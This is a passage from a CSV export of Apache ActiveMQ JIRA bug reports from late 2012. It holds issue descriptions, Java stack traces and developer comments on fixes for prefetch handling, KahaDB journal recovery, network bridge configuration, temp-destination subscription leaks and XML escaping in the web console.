However in the case that the broker chooses 0, to make all consumers pull messages, this information needs to be propagated back to the consumer to allow the receive(..) call to initiate a pull. Currently it is conditional on the consumer prefetch value == 0 which is currently not updated.

The fix is to have the broker send a connection control message to update the prefetch when broker config uses 0, and have the receive(..) call check the current prefetch value.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4226,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,297900,,,Mon Dec 17 13:46:29 UTC 2012,,,,,,,,,,,"0|i14vxj:",236638,,,,,,,,,,,,,,,,,,,,,"17/Dec/12 13:46;gtully;consumer now gets notification of real effective prefetch so it can do a pull when appropriate;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"ProducerBrokerExchange holds reference to ""region"" destination after message has been sent",AMQ-4222,12623793,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,13/Dec/12 18:16,14/Dec/12 17:43,14/Jul/23 05:43,14/Dec/12 17:43,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"So in the case of temp destinations, if a producer produces to the temporary destination, and the messages don't get consumed right away, but the temp dest goes away, the ProducerBrokerExchange in the TransportConnection for the producer's connection will still hold the reference to the destination which will keep it from being GCd properly. 

Test forthcoming...",,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,297493,,,Fri Dec 14 17:43:54 UTC 2012,,,,,,,,,,,"0|i14p2n:",235527,,,,,,,,,,,,,,,,,,,,,"14/Dec/12 17:43;ceposta;Fixed in r1421994;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NPE plist (temp) sparse removal - filependingmessagecursor with selector and expiry,AMQ-4221,12623775,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/Dec/12 16:15,13/Dec/12 16:45,14/Jul/23 05:43,13/Dec/12 16:45,5.7.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"{code}2012-12-13 11:37:27,027 [calhost] Task-1] - ERROR Queue                          - Failed to page in more queue messages 
java.lang.NullPointerException
	at org.apache.kahadb.index.ListNode.access$200(ListNode.java:37)
	at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:265)
	at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:255)
	at org.apache.kahadb.page.Transaction.store(Transaction.java:248)
	at org.apache.kahadb.index.ListIndex.storeNode(ListIndex.java:326)
	at org.apache.kahadb.index.ListNode.store(ListNode.java:332)
	at org.apache.kahadb.index.ListNode.access$500(ListNode.java:37)
	at org.apache.kahadb.index.ListNode$ListIterator.remove(ListNode.java:227)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator$1.execute(PList.java:229)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:771)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.remove(PList.java:226)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.remove(FilePendingMessageCursor.java:517)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.remove(FilePendingMessageCursor.java:321)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1735)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1948)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1465)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
{code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,297475,,,Thu Dec 13 16:45:00 UTC 2012,,,,,,,,,,,"0|i14oy7:",235507,,,,,,,,,,,,,,,,,,,,,"13/Dec/12 16:45;gtully;fix in http://svn.apache.org/viewvc?rev=1421373&view=rev

dangling reference to free page in listindex, can lead to npe (best case) or corruption if page is subsequently reused by another listindex or cce in other cases.
Effects the filependingmessage cursor with sparse expiry, one example would be a sparse selector where the remainder (on disk) expire.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"PageFile is not loaded when recreating queue and perDestination=""true""",AMQ-4220,12623621,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,devoncrouse@gmail.com,devoncrouse@gmail.com,12/Dec/12 20:52,13/Dec/12 01:28,14/Jul/23 05:43,13/Dec/12 01:28,5.7.0,,,,,5.8.0,,,Broker,,,,1,,,,,,,,,"We create a queue, delete it through the admin interface, and attempt to recreate it, receiving the error below on the client. When filteredKahaDB perDestination is disabled, queues can be deleted and recreated without issues.

javax.jms.JMSException: PageFile is not loaded
        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1295)
        at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1874)
        at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:254)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:1116)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:1060)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:973)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:946)
        at com.returnpath.common.activemq.Consumer.connect(Consumer.java:60)
        at com.returnpath.cert.loader.MessageConsumer.connectToQueue(MessageConsumer.java:176)
        at com.returnpath.cert.loader.MessageConsumer.run(MessageConsumer.java:51)
        at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.IllegalStateException: PageFile is not loaded
        at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:809)
        at org.apache.kahadb.page.PageFile.tx(PageFile.java:303)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.getMessageCount(KahaDBStore.java:479)
        at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101)
        at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101)
        at org.apache.activemq.broker.region.Queue.initialize(Queue.java:376)
        at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:86)
        at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:532)
        at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56)
        at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:137)
        at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:283)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:175)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
        at org.apache.activemq.broker.region.AbstractRegion.lookup(AbstractRegion.java:454)
        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:266)
        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:418)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:257)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:92)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)
        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:562)
        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:332)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:152)
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:256)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)
        at java.lang.Thread.run(Thread.java:662)
",CentOS release 6.2 (Final),devoncrouse@gmail.com,guildencrantz,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,297342,,,Thu Dec 13 01:28:28 UTC 2012,,,,,,,,,,,"0|i14o27:",235363,,,,,,,,,,,,,,,,,,,,,"12/Dec/12 23:03;tabish;Confirmed this with a little unit test, will look into it. ;;;","13/Dec/12 01:28;tabish;Fix added in trunk with test.  Will show up in the next nightly;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMS selector statement not displayed correctly in subscribers web view if contains XML-prohibited characters,AMQ-4218,12623366,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,wrobelda,wrobelda,11/Dec/12 12:03,11/Dec/12 16:32,14/Jul/23 05:43,11/Dec/12 16:32,5.7.0,,,,,5.8.0,,,,,,,0,escaping,jsp,selector,webconsole,webgui,web-ui,xml,,"The issue reported affects two similar use cases:
* XML view of JMS subscribers is rendered with syntax errors if any of the subscribers has a selector containing an XML-prohibited character in its statement, e.g. {{PROPERTY <> VALUE}} selector statement contains {{<}} and {{>}} characters that cause XML syntax errors
* HTML view of JMS subscribers does not properly display the selector statement if it contains any of the XML-prohibited characters in it, e.g. {{PROPERTY <> VALUE}} will be displayed as {{PROPERTY VALUE}} - both the {{<}} and {{>}} characters are stripped out
 
The solution is to use the {{<c:out value=""""/>}} syntax whenever an XML-unescaped string is to be outputted - the {{c:out}} has the {{escapeXml}} property set to {{true}} by default which does the trick.

I have attached the patch that fixes the XML escaping for JMS selector. 

Please note that I could not find any JMS naming specification to make sure whether the JMS selector is the only field that is allowed to contain XML-prohibited characters. Therefore I would advise the patch reviewer to figure  out whether this fix should also be applied to JMS Client ID, Connection ID, Destination Name and Subscription name fields.",,tabish,wrobelda,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Dec/12 12:05;wrobelda;AMQ-4218.patch;https://issues.apache.org/jira/secure/attachment/12560379/AMQ-4218.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,297063,,,Tue Dec 11 16:32:43 UTC 2012,,,,,,,Patch Available,,,,"0|i14l4f:",234885,,,,,,,,,,,,,,,,,,,,,"11/Dec/12 12:05;wrobelda;A patch that fixes the JMS selector statement issue;;;","11/Dec/12 16:32;tabish;Patch looks good, thanks. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Simplify PList interface and provide a LevelDB store implementation.,AMQ-4215,12623016,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,08/Dec/12 14:56,28/Jan/13 15:30,14/Jul/23 05:43,28/Jan/13 15:30,,,,,,5.8.0,,,,,,,0,,,,,,,,,,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,296606,,,Mon Jan 28 15:30:50 UTC 2013,,,,,,,,,,,"0|i14akn:",233176,,,,,,,,,,,,,,,,,,,,,"28/Jan/13 15:24;tabish;@Hiram can we mark this resolved for 5.8.0 now?;;;","28/Jan/13 15:30;chirino;Yep. resolved.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker may be unable to recover durable topic subscription from the kahadb journal,AMQ-4212,12622917,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tmielke,tmielke,07/Dec/12 16:03,18/Jan/16 22:29,14/Jul/23 05:43,15/Apr/13 18:17,5.7.0,,,,,5.9.0,,,Message Store,,,,0,,,,,,,,,"KahaDB is supposed to recover its index from the journal *completely*. 
Such recovery can be enforced by stopping the broker, deleting the db.data index file and restarting the broker. 

The recovery process may however not be able to recover inactive durable topic subscriptions. 
This is because the kahadb cleanup task will not consider any active subscription entries in the journal files when marking journal files for deletion. 

E.g. If a durable sub info was written to e.g. the journal file db-1.log but kahadb has already rolled over to writing to db-2.log, the cleanup task may delete db1.log (in case all msgs in db1.log got acked). The durable sub however is still alive. 
When stopping the broker this durable sub info is still present in the index file and will be restored at broker restart.
If however the index file gets deleted in order to enforce a recovery of the index from the journal, then the broker has lost the information about this durable sub.
The broker is therefore not able to recover its state fully from the journal files.

If the durable subscriber remains inactive (i.e. does not reconnect to broker immediately after broker restart), it may miss messages as the broker has no knowledge of this durable sub. 




",kahadb and durable topic subscribers,ceposta,gtully,tabish,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2832,,,AMQ-6131,,,,,,,,,,,,,"12/Apr/13 22:08;tabish;AMQ4212Patch.txt;https://issues.apache.org/jira/secure/attachment/12578522/AMQ4212Patch.txt","10/Apr/13 23:37;tabish;AMQ4212Test.java;https://issues.apache.org/jira/secure/attachment/12578110/AMQ4212Test.java","10/Apr/13 18:55;tabish;AMQ4212Test.java;https://issues.apache.org/jira/secure/attachment/12578060/AMQ4212Test.java","17/Jan/13 23:44;tabish;AMQ4212Test.java;https://issues.apache.org/jira/secure/attachment/12565397/AMQ4212Test.java",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,296495,,,Mon Apr 15 18:17:55 UTC 2013,,,,,,,,,,,"0|i149rr:",233046,,,,,,,,,,,,,,,,,,,,,"14/Jan/13 15:59;tabish;@Torsten do you have any tests for this issue we can use to evaluate?;;;","17/Jan/13 17:23;tmielke;@Tim, don't have a unit test yet but presumably can create one. It will have to wait until February though as I am currently on vacation.;;;","17/Jan/13 23:24;tabish;Ok, created a test case that reproduces the issue. ;;;","18/Jan/13 17:32;tabish;Fixing this is a bit tricky and would involve tracking the location of the subscription commands in the log files for the StoredDestination and the durable subs associated with each.  The downside here is that you can start retaining log files for only that one subscription command which isn't really ideal.  

Fixing this might lead down the path of needing periodic compaction or a means at least of triggering one otherwise its quite hard to control how much wasted spaced you'd have for the leftovers. ;;;","15/Feb/13 16:33;gtully;the workaround is to archive data files when they are gc'ed by the persistence adapter. Then revert to the archived data before rebuilding the index.
{code}archiveDataLogs=""true""{code}  attribute of kahadb;;;","10/Apr/13 18:55;tabish;updated test case;;;","10/Apr/13 23:37;tabish;Adds additional test to show that when fixed the recovered messages from the journal can be replayed because acks on GC'd files can get lost. ;;;","12/Apr/13 22:08;tabish;Current patch for this issue and AMQ-2832.  Adding it now so it doesn't get lost, will get back to testing next week.;;;","15/Apr/13 18:17;tabish;fix and tests added to trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DynamicallyIncludedDestinations is not enforced for the other end of duplex bridge,AMQ-4210,12620389,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,06/Dec/12 21:43,07/Dec/12 16:15,14/Jul/23 05:43,07/Dec/12 16:15,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,Because of AMQ-4209 dynamicallyAddedDestinations are not honored,,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4209,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,296388,,,Fri Dec 07 16:15:26 UTC 2012,,,,,,,,,,,"0|i1491b:",232927,,,,,,,,,,,,,,,,,,,,,"06/Dec/12 22:15;ceposta;With AMQ-4209 the following would happen:

Bridges would be configured with the excluded/dynamicallyIncluded/staticallyIncluded destinations that were private to NetworkConnector. But getDestinationFilter would be called on NetworkBridgeConfiguration and that would use the dynamicallyIncludedDestinations that was local to itself (which would usually just be empty). This would lead to always allowing ALL consumers on the bridge instead of those ""dynamically included"" which would be the source for the destinationFilter.

;;;","07/Dec/12 16:15;ceposta;Fixed in r1418373;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NetworkConnector and NetworkBridgeConfiguration have same named private variables for excludedDestination,AMQ-4209,12618973,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,06/Dec/12 00:28,07/Dec/12 16:15,14/Jul/23 05:43,07/Dec/12 16:15,5.7.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"NetworkConnector extends from NetworkBridgeConfiguration. Both NetworkConnector and NetworkBridgeConfiguration have private fields named ""private List<ActiveMQDestination> excludedDestinations"" Not only is it confusing which list ends up being used to configure the bridge, but duplex connectors could have a bug because of this. I'll write a test to reproduce.
",,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4210,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,296242,,,Fri Dec 07 16:15:10 UTC 2012,,,,,,,,,,,"0|i1478f:",232635,,,,,,,,,,,,,,,,,,,,,"06/Dec/12 17:56;ceposta;Seems for excludedDestinations, there are no cases where the method resolution order causes anything to fail.. but it's just waiting to happen.

However, not only excludedDestination is duplicated in the class hierarchy. So are dynamicallyIncludedDestinations and staticallyIncludedDestinations. DynamicallyIncludedDestinations being repeated *DOES* cause a bug. I will write a test case for that (in the process). 

I will remove this duplication as it's just waiting for more bugs.;;;","06/Dec/12 17:57;ceposta;BTW... huge thanks to those that wrote DuplexNetworkTest... caught this :);;;","07/Dec/12 16:15;ceposta;Fixed in r1418373;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMSX* properties not included in the getPropertyNames() enumeration,AMQ-4201,12618563,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,03/Dec/12 13:38,03/Dec/12 13:43,14/Jul/23 05:43,03/Dec/12 13:43,5.7.0,,,,,5.8.0,,,JMS client,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,293399,,,2012-12-03 13:38:04.0,,,,,,,,,,,"0|i0szhz:",167228,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error in XML in documentation - lease database locker,AMQ-4197,12618189,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,ibeaumont,ibeaumont,29/Nov/12 18:05,29/Nov/12 19:07,14/Jul/23 05:43,29/Nov/12 19:07,5.7.0,,,,,,,,Documentation,,,,0,,,,,,,,,"The XML for Lease Database Locker on this page 
http://activemq.apache.org/pluggable-storage-lockers.html#Pluggablestoragelockers-LeaseDatabaseLocker
has the incorrect closing tag for locker...
Should be
</locker>
not
</Locker>",,ibeaumont,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,292814,,,Thu Nov 29 19:07:41 UTC 2012,,,,,,,,,,,"0|i0sehj:",163823,,,,,,,,,,,,,,,,,,,,,"29/Nov/12 19:07;tabish;Updated the wiki source, will take a bit to propagate the change to the website. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition between removal of subscriptions and removal of destinations in a network of brokers,AMQ-4196,12618151,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,29/Nov/12 13:16,02/May/13 02:30,14/Jul/23 05:43,29/Nov/12 22:11,5.6.0,5.7.0,,,,5.8.0,,,Broker,Connector,,,0,networkBridge,Temp,,,,,,,"n a broker network like this: A <--> B <---> C

Scenario:

A producer to BrokerA creates a message, sets its replyTo header to a temp destination that it creates and listens on, then sends the message off to broker A. The message is demand forwarded to BrokerC because there is a consumer there that consumes the message and replies to the temp dest in the replyTo header.

As the number of concurrent producers on BrokerA sending these messages increases, the subscription to the temp destination that was demand forwarded will not be cleaned up properly on BrokerC. The reason for this is the DemandForwardingBridge runs the remove consumer code in a separate thread. But if a ""remove destination"" advisory messages comes in, it will remove the destination from the AdvisoryBroker's destination map. So if this happens before the code for removeConsumer runs (in AdvisoryBroker), then the destination will not be in the destination map and the advisory for removeConsumer will not fire.

The net result is a subscription leak in the network bridge on B & C

The junit test shows two issues:

1) the subscriptions leaked when concurrent producers using request/reply and correctly closing the consumer and connection
2) all subscriptions leaked when using a single producer with request/reply and closing only the connection, and not the consumer explicitly

Issue 2 is related to temp destinations only and is compounded by 
https://issues.apache.org/jira/browse/AMQ-3879",,artnaseef,ceposta,gtully,lionel.cons,lukejackson,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3879,AMQ-3038,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,292773,,,Mon Dec 10 21:09:16 UTC 2012,,,,,,,,,,,"0|i0se3z:",163762,,,,,,,,,,,,,,,,,,,,,"29/Nov/12 13:18;gtully;The deletion of temp destinations before close cause a problem when there are active consumers. The broker will remove the consumers but will not fire advisories for their removal because the destination is already gone.
The broker side will remove the temp destinations so it is not necessary in the normal case. Only for a pooled connection, where the connection is not closed broker side. The pool ensures that sessions are closed so removing temps is fine in that case.;;;","29/Nov/12 13:59;gtully;This may be the root cause of the lack of advisories when connection.close is called with active consumes. Clearing out the list is sufficient for the client side memory issue. The broker handles cleanup of the temp dests broker side.;;;","29/Nov/12 22:11;gtully;fix in http://svn.apache.org/viewvc?rev=1415406&view=rev

two different problems uncovered by the two test case variants

1) order of removedest and remove sub advisory handling. serialized that
2) deleting temp dests as part of close (client side) caused dropped advisories if there were pending consumers. Left removal of temps to the broker shutdown connection processing.;;;","29/Nov/12 22:29;ceposta;I like it! Nice fix.;;;","03/Dec/12 21:18;artnaseef;Is this a fully robust solution?  Given the impact of missing consumers on removal of a temporary destination (memory leak, leaked destinations, and leaked threads), the removal of all consumers when the temporary destination is deleted seems important to keep all the way around.

In addition, the nature of advisories includes sending destination removals and consumer removals through different destinations, and therefore different threads (dest remove on ActiveMQ.Advisory.TempQueue/TempTopic and consumer remove on ActiveMQ.Advisory.Consumer.ID...) which also leads to out-of-order processing.  In this case, the change here will have no impact.
;;;","03/Dec/12 22:35;gtully;@Arthur - any outstanding consumers will be network bridge local forwarding consumers that will be removed when the remote destination is removed. Following the normal, respond to advisories approach.

On the threading - dispatch occurs in the sending thread and so long as only one network bridge is dealing with temp destinations, a single consumer will be dealing with all advisories in the order in which they are produced.

Feel free to provide more test cases that can demonstrate that there still is a problem.;;;","03/Dec/12 22:38;artnaseef;Working on the test cases.

